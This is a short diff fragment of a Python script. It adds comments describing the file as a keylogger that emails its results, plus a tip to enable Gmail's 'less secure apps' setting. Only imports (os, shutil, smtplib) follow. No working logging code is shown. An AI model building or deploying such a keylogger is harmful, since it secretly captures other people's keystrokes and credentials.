@@ -1,4 +1,11 @@
 #!usr/bin/env python
+
+# Keylogger created by pj-022
+
+# For this to work you have to enable the 'less secure apps' function on the email you want to use in keylogger
+# You can search that in security settings of your gmail account
+
+
 import os
 import shutil
 import smtplib
